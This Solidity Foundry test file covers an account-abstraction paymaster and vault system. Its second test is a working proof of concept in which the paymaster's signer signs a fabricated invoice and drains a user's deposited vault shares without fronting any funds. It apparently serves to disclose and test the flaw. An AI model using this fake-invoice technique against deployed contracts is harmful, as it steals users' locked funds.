// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {EntryPoint} from "account-abstraction/core/EntryPoint.sol";
import {PackedUserOperation} from "account-abstraction/core/UserOperationLib.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CABPaymaster} from "../src/paymasters/CABPaymaster.sol";
import {InvoiceManager} from "../src/core/InvoiceManager.sol";
import {VaultManager} from "../src/vaults/VaultManager.sol";
import {IVaultManager} from "../src/interfaces/IVaultManager.sol";
import {BaseVault} from "../src/vaults/BaseVault.sol";
import {IInvoiceManager} from "../src/interfaces/IInvoiceManager.sol";
import {UpgradeableOpenfortProxy} from "../src/proxy/UpgradeableOpenfortProxy.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {IPaymasterVerifier} from "../src/interfaces/IPaymasterVerifier.sol";
import {UserOpSettlement} from "../src/settlement/UserOpSettlement.sol";
import {IPaymaster} from "account-abstraction/interfaces/IPaymaster.sol";
import {ICrossL2Prover} from "@vibc-core-smart-contracts/contracts/interfaces/ICrossL2Prover.sol";

contract CABPaymasterTest is Test {
    uint256 immutable BASE_CHAIN_ID = 8453;
    uint256 immutable PAYMSTER_BASE_MOCK_ERC20_BALANCE = 100000;

    CABPaymaster public paymaster;
    InvoiceManager public invoiceManager;
    VaultManager public vaultManager;
    ICrossL2Prover public crossL2Prover;
    BaseVault public openfortVault;
    MockERC20 public mockERC20;

    EntryPoint public entryPoint;

    UserOpSettlement public settlement;

    address public verifyingSignerAddress;
    uint256 public verifyingSignerPrivateKey;
    address public owner;
    address public rekt;

    function setUp() public {
        entryPoint = new EntryPoint();
        owner = address(1);

        rekt = address(0x9590Ed0C18190a310f4e93CAccc4CC17270bED40);
        crossL2Prover = ICrossL2Prover(address(0xBA3647D0749Cb37CD92Cc98e6185A77a8DCBFC62));

        verifyingSignerPrivateKey = uint256(keccak256(abi.encodePacked("VERIFIYING_SIGNER")));
        verifyingSignerAddress = vm.addr(verifyingSignerPrivateKey);
        vm.label(verifyingSignerAddress, "VERIFIYING_SIGNER");

        invoiceManager = InvoiceManager(payable(new UpgradeableOpenfortProxy(address(new InvoiceManager()), "")));
        vaultManager = VaultManager(
            payable(
                new UpgradeableOpenfortProxy(
                    address(new VaultManager()),
                    abi.encodeWithSelector(
                        VaultManager.initialize.selector, owner, IInvoiceManager(address(invoiceManager)), 42
                    )
                )
            )
        );
        mockERC20 = new MockERC20();
        openfortVault = BaseVault(
            payable(
                new UpgradeableOpenfortProxy(
                    address(new BaseVault()),
                    abi.encodeWithSelector(
                        BaseVault.initialize.selector, IVaultManager(address(vaultManager)), mockERC20
                    )
                )
            )
        );
        invoiceManager.initialize(owner, IVaultManager(address(vaultManager)));
        settlement = UserOpSettlement(payable(new UpgradeableOpenfortProxy(address(new UserOpSettlement()), "")));
        paymaster = new CABPaymaster(entryPoint, invoiceManager, crossL2Prover, verifyingSignerAddress, owner);
        settlement.initialize(owner, address(paymaster));

        mockERC20.mint(address(paymaster), PAYMSTER_BASE_MOCK_ERC20_BALANCE);

        assertEq(address(invoiceManager.vaultManager()), address(vaultManager));
        assertEq(address(vaultManager.invoiceManager()), address(invoiceManager));
    }

    function getEncodedSponsorTokens(uint8 len) internal returns (bytes memory encodedSponsorToken) {
        IPaymasterVerifier.SponsorToken[] memory sponsorTokens = new IPaymasterVerifier.SponsorToken[](len);
        for (uint8 i = 0; i < len; i++) {
            sponsorTokens[i] =
                IPaymasterVerifier.SponsorToken({token: address(mockERC20), spender: rekt, amount: 10000});
            encodedSponsorToken = bytes.concat(
                encodedSponsorToken,
                bytes20(sponsorTokens[i].token),
                bytes20(sponsorTokens[i].spender),
                bytes32(sponsorTokens[i].amount)
            );
        }
        return abi.encodePacked(uint8(len), encodedSponsorToken);
    }

    function testValidateUserOp() public {
        bytes memory sponsorTokensBytes = getEncodedSponsorTokens(2);
        uint48 validUntil = 1732810044 + 1000;
        uint48 validAfter = 1732810044;
        uint128 preVerificationGas = 1e5;
        uint128 postVerificationGas = 1e5;
        bytes memory paymasterAndData = bytes.concat(
            bytes20(address(paymaster)),
            bytes16(preVerificationGas),
            bytes16(postVerificationGas),
            bytes6(validUntil),
            bytes6(validAfter),
            sponsorTokensBytes
        );

        PackedUserOperation memory userOp = PackedUserOperation({
            sender: rekt,
            nonce: 0,
            initCode: "",
            callData: "",
            accountGasLimits: bytes32(uint256(1e18)),
            preVerificationGas: preVerificationGas,
            gasFees: bytes32(uint256(1e4)),
            paymasterAndData: paymasterAndData,
            signature: ""
        });

        bytes32 userOpHash = keccak256(
            abi.encode(
                userOp.sender,
                userOp.nonce,
                keccak256(userOp.initCode),
                keccak256(userOp.callData),
                userOp.accountGasLimits,
                keccak256(sponsorTokensBytes),
                uint256(bytes32(abi.encodePacked(preVerificationGas, postVerificationGas))),
                userOp.preVerificationGas,
                userOp.gasFees,
                block.chainid,
                address(paymaster),
                validUntil,
                validAfter
            )
        );

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(verifyingSignerPrivateKey, MessageHashUtils.toEthSignedMessageHash(userOpHash));
        // Append signature to paymasterAndData
        bytes memory signature = abi.encodePacked(r, s, v);
        userOp.paymasterAndData = abi.encodePacked(userOp.paymasterAndData, signature);
        vm.startPrank(address(entryPoint));
        (bytes memory context, uint256 validationData) =
            paymaster.validatePaymasterUserOp(userOp, userOpHash, type(uint256).max);

        // validate postOp
        paymaster.postOp(IPaymaster.PostOpMode.opSucceeded, context, 1222, 42);

        // Same userOpHash has two sponsor token
        (address token1, address spender1, uint256 amount1) = settlement.userOpWithSponsorTokens(userOpHash, 0);
        assertEq(token1, address(mockERC20));
        assertEq(spender1, rekt);
        assertEq(amount1, 10000);

        (address token2, address spender2, uint256 amount2) = settlement.userOpWithSponsorTokens(userOpHash, 1);
        assertEq(token2, address(mockERC20));
        assertEq(spender2, rekt);
        assertEq(amount2, 10000);
    }

    function testRektCanGetRekt() public {
        vm.prank(owner);
        vaultManager.addVault(openfortVault);

        vm.startPrank(rekt);
        invoiceManager.registerPaymaster(address(paymaster), paymaster, block.timestamp + 1000);
        mockERC20.mint(rekt, 10000);

        // Rekt Has 10000 MockERC20
        assertEq(mockERC20.balanceOf(rekt), 10000);

        mockERC20.approve(address(vaultManager), 10000);
        vaultManager.deposit(mockERC20, openfortVault, 10000, false);

        // Openfort Vault Has 10000 MockERC20
        assertEq(openfortVault.totalAssets(), 10000);
        // Rekt Has 10000 Shares In Openfort Vault
        assertEq(vaultManager.vaultShares(rekt, openfortVault), 10000);

        IInvoiceManager.RepayTokenInfo[] memory repayTokenInfos = new IInvoiceManager.RepayTokenInfo[](1);
        repayTokenInfos[0] =
            IInvoiceManager.RepayTokenInfo({vault: openfortVault, amount: 10000, chainId: BASE_CHAIN_ID});
        IInvoiceManager.InvoiceWithRepayTokens memory maliciousInvoice = IInvoiceManager.InvoiceWithRepayTokens({
            account: rekt,
            nonce: 0,
            paymaster: address(paymaster),
            sponsorChainId: BASE_CHAIN_ID,
            repayTokenInfos: repayTokenInfos
        });

        // This Invoice hash doesn't map to any legit invoice
        // Paymaster didn't front any fund for rekt
        // But still can sign this fake invoice and get repaid
        // from rekt locked asset.
        bytes32 maliciousInvoiceHash = keccak256(
            abi.encode(
                maliciousInvoice.account,
                maliciousInvoice.nonce,
                maliciousInvoice.paymaster,
                maliciousInvoice.sponsorChainId,
                keccak256(abi.encode(maliciousInvoice.repayTokenInfos))
            )
        );

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(verifyingSignerPrivateKey, MessageHashUtils.toEthSignedMessageHash(maliciousInvoiceHash));

        vm.chainId(BASE_CHAIN_ID);
        // Paymaster verifyingSigner calls repay with a fake invoice signature
        invoiceManager.repay(keccak256("fake invoice"), maliciousInvoice, abi.encodePacked(r, s, v));
        // Rekt has been rekt
        assertEq(vaultManager.vaultShares(rekt, openfortVault), 0);
        // Evil Malicious Paymaster Has 10000 MockERC20
        assertEq(mockERC20.balanceOf(address(paymaster)), PAYMSTER_BASE_MOCK_ERC20_BALANCE + 10000);
    }
}
